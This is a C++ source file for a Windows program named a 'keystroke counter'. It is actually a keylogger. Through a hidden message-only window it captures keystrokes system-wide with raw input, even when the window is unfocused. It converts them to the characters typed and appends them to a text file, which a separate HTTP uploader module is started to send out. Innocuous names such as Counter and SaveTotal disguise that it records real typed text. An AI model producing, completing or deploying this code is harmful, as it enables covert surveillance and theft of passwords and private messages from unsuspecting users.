#define WIN32_LEAN_AND_MEAN
#define NOMINMAX
#include <windows.h>
#include "keystroke_counter.h"
#include "http_upload.h"

// Freestanding build (-nostdlib) provides no CRT, but the compiler still emits
// calls to memset/memcpy for aggregate zero-initialization and for RtlCopyMemory.
// Supply them here; the volatile loops keep the optimizer from folding them back
// into self-referential libcalls.
extern "C" void* memset(void* destination, int value, size_t count) {
    volatile unsigned char* bytes = static_cast<volatile unsigned char*>(destination);
    while (count--) *bytes++ = static_cast<unsigned char>(value);
    return destination;
}

extern "C" void* memcpy(void* destination, const void* source, size_t count) {
    volatile unsigned char* to = static_cast<volatile unsigned char*>(destination);
    const volatile unsigned char* from = static_cast<const volatile unsigned char*>(source);
    while (count--) *to++ = *from++;
    return destination;
}

namespace {
constexpr wchar_t kWindowClass[] = L"PDF.KeystrokeCount.MessageOnly";
constexpr UINT_PTR kSaveTimer = 1;
constexpr UINT kSaveDelayMs = 5000;

struct Counter {
    wchar_t* path;
    wchar_t* textBuffer;
    size_t textBufferSize;
    size_t textBufferUsed;
    bool pending;
    bool timerArmed;
    SRWLOCK fileLock;
};
Counter counter;

// Resolve beside the executable, independently of the launch working directory.
wchar_t* ResolveCountPath() {
    constexpr wchar_t filename[] = L"yourtext.txt";
    constexpr DWORD maximum = 32768;
    for (DWORD capacity = MAX_PATH;; capacity = capacity > maximum / 2 ? maximum : capacity * 2) {
        wchar_t* path = static_cast<wchar_t*>(HeapAlloc(GetProcessHeap(), 0,
                                                       capacity * sizeof(wchar_t)));
        if (!path) return nullptr;
        const DWORD length = GetModuleFileNameW(nullptr, path, capacity);
        if (length && length < capacity) {
            DWORD start = length;
            while (start && path[start - 1] != L'\\' && path[start - 1] != L'/') --start;
            if (!start) { HeapFree(GetProcessHeap(), 0, path); return nullptr; }
            const DWORD required = start + sizeof(filename) / sizeof(wchar_t);
            if (required > capacity) {
                wchar_t* resized = static_cast<wchar_t*>(HeapReAlloc(GetProcessHeap(), 0,
                    path, required * sizeof(wchar_t)));
                if (!resized) { HeapFree(GetProcessHeap(), 0, path); return nullptr; }
                path = resized;
            }
            lstrcpyW(path + start, filename);
            return path;
        }
        HeapFree(GetProcessHeap(), 0, path);
        if (!length || capacity == maximum) return nullptr;
    }
}

bool InitializeFile() {
    counter.path = ResolveCountPath();
    if (!counter.path) return false;
    HANDLE file = CreateFileW(counter.path, GENERIC_READ | FILE_APPEND_DATA,
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        nullptr, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (file != INVALID_HANDLE_VALUE) {
        CloseHandle(file);
    }
    
    // Initialize text buffer
    counter.textBuffer = static_cast<wchar_t*>(HeapAlloc(GetProcessHeap(), 0, 4096 * sizeof(wchar_t)));
    if (!counter.textBuffer) return false;
    counter.textBufferSize = 4096;
    counter.textBufferUsed = 0;
    
    return true;
}

bool SaveTotal() {
    if (!counter.pending || !counter.path) return true;
    
    AcquireSRWLockExclusive(&counter.fileLock);
    wchar_t* textToSave = counter.textBuffer;
    size_t textToSaveLength = counter.textBufferUsed;
    // Reset buffer for next use
    counter.textBufferUsed = 0;
    counter.pending = false;
    ReleaseSRWLockExclusive(&counter.fileLock);

    if (textToSaveLength == 0) return true;

    HANDLE file = CreateFileW(counter.path, FILE_APPEND_DATA,
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        nullptr, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (file == INVALID_HANDLE_VALUE) {
        return false;
    }
    
    // Convert to UTF-8 to safely handle any typed characters
    int size_needed = WideCharToMultiByte(CP_UTF8, 0, textToSave, (int)textToSaveLength, NULL, 0, NULL, NULL);
    bool success = false;
    DWORD written = 0;
    if (size_needed > 0) {
        char* utf8_text = static_cast<char*>(HeapAlloc(GetProcessHeap(), 0, (size_t)size_needed));
        if (utf8_text) {
            const int converted = WideCharToMultiByte(CP_UTF8, 0, textToSave,
                (int)textToSaveLength, utf8_text, size_needed, NULL, NULL);
            if (converted == size_needed) {
                success = WriteFile(file, utf8_text, (DWORD)size_needed, &written, nullptr) != FALSE
                          && written == (DWORD)size_needed;
            }
            HeapFree(GetProcessHeap(), 0, utf8_text);
        }
    }

    CloseHandle(file);
    return success;
}

void CountEvent(HWND window, DWORD deviceType, USHORT flags, USHORT vKey, USHORT makeCode) {
    if (deviceType != RIM_TYPEKEYBOARD || (flags & RI_KEY_BREAK)) return;
    
    BYTE ks[256] = {0};
    GetKeyboardState(ks);
    wchar_t charBuffer[5];
    UINT scanCode = makeCode | (flags & RI_KEY_E0 ? 0xE000 : 0);
    
    // Translate virtual key and scan code to actual typed character(s)
    int result = ToUnicode(vKey, scanCode, ks, charBuffer, 4, 0);
    if (result > 0) {
        AcquireSRWLockExclusive(&counter.fileLock);
        
        // Check if we need to resize buffer
        if (counter.textBufferUsed + result >= counter.textBufferSize) {
            size_t newSize = counter.textBufferSize * 2;
            wchar_t* resized = static_cast<wchar_t*>(HeapReAlloc(GetProcessHeap(), 0, 
                counter.textBuffer, newSize * sizeof(wchar_t)));
            if (resized) {
                counter.textBuffer = resized;
                counter.textBufferSize = newSize;
            } else {
                // If we can't resize, just drop the new input - not ideal but prevents crash
                ReleaseSRWLockExclusive(&counter.fileLock);
                return;
            }
        }
        
        // Copy characters to buffer
        RtlCopyMemory(counter.textBuffer + counter.textBufferUsed,
                      charBuffer, (size_t)result * sizeof(wchar_t));
        counter.textBufferUsed += result;
        counter.pending = true;
        ReleaseSRWLockExclusive(&counter.fileLock);
        
        if (!counter.timerArmed) {
            counter.timerArmed = SetTimer(window, kSaveTimer, kSaveDelayMs, nullptr) != 0;
            if (!counter.timerArmed) SaveTotal();
        }
    }
}

bool CheckpointBeforeClear(void* context) {
    (void)context;
    // Reuse SaveTotal to flush any pending text before the uploader clears/acts
    return SaveTotal();
}

LRESULT CALLBACK CounterWindow(HWND window, UINT message, WPARAM wParam, LPARAM lParam) {
    if (message == WM_INPUT) {
        RAWINPUT input;
        UINT size = sizeof(input);
        const UINT read = GetRawInputData(reinterpret_cast<HRAWINPUT>(lParam), RID_INPUT,
                                          &input, &size, sizeof(RAWINPUTHEADER));
        if (read != UINT(-1) && read >= sizeof(RAWINPUTHEADER) + sizeof(RAWKEYBOARD)
            && input.header.dwType == RIM_TYPEKEYBOARD) {
            CountEvent(window, input.header.dwType, input.data.keyboard.Flags, 
                       input.data.keyboard.VKey, input.data.keyboard.MakeCode);
        }
        SecureZeroMemory(&input, sizeof(input));
        return DefWindowProcW(window, message, wParam, lParam);
    }
    if (message == WM_TIMER && wParam == kSaveTimer) {
        KillTimer(window, kSaveTimer);
        counter.timerArmed = false;
        SaveTotal();
        return 0;
    }
    return DefWindowProcW(window, message, wParam, lParam);
}
} // namespace

DWORD RunKeystrokeCounter(HANDLE stopEvent) {
    const HINSTANCE instance = GetModuleHandleW(nullptr);
    WNDCLASSW windowClass = {};
    windowClass.lpfnWndProc = CounterWindow;
    windowClass.hInstance = instance;
    windowClass.lpszClassName = kWindowClass;
    if (!RegisterClassW(&windowClass)) return 1;
    
    HWND window = CreateWindowExW(0, kWindowClass, L"", 0, 0, 0, 0, 0,
                                 HWND_MESSAGE, nullptr, instance, nullptr);
    if (!window) {
        UnregisterClassW(kWindowClass, instance);
        return 1;
    }
    
    InitializeFile();
    
    RAWINPUTDEVICE keyboard = {0x01, 0x06, RIDEV_INPUTSINK, window};
    CountUploadSource uploadSource = {counter.path, &counter.fileLock, stopEvent,
                                     CheckpointBeforeClear, &counter};
    HANDLE uploader = nullptr;
    DWORD result = 0;
    
    if (!RegisterRawInputDevices(&keyboard, 1, sizeof(keyboard))) {
        result = 1;
    } else {
        uploader = StartCountUploader(&uploadSource);
        for (;;) {
            const DWORD wait = MsgWaitForMultipleObjectsEx(1, &stopEvent, INFINITE,
                                                          QS_ALLINPUT, MWMO_INPUTAVAILABLE);
            if (wait == WAIT_OBJECT_0) break;
            if (wait == WAIT_FAILED) {
                result = 1;
                break;
            }
            MSG message;
            for (unsigned batch = 0; batch < 256 && PeekMessageW(&message, nullptr, 0, 0, PM_REMOVE); ++batch) {
                DispatchMessageW(&message);
            }
        }
        keyboard.dwFlags = RIDEV_REMOVE;
        keyboard.hwndTarget = nullptr;
        RegisterRawInputDevices(&keyboard, 1, sizeof(keyboard));
    }
    
    SetEvent(stopEvent);
    if (counter.timerArmed) KillTimer(window, kSaveTimer);
    SaveTotal();
    
    if (uploader) {
        WaitForSingleObject(uploader, INFINITE);
        CloseHandle(uploader);
    }
    
    if (counter.path) HeapFree(GetProcessHeap(), 0, counter.path);
    if (counter.textBuffer) HeapFree(GetProcessHeap(), 0, counter.textBuffer);
    counter.path = nullptr;
    counter.textBuffer = nullptr;
    DestroyWindow(window);
    UnregisterClassW(kWindowClass, instance);
    return result;
}




// .\build.ps1 -LlvmBin "C:\Users\JahanmalAgha\AppData\Local\Android\Sdk\ndk\30.0.16248370\toolchains\llvm\prebuilt\windows-x86_64\bin"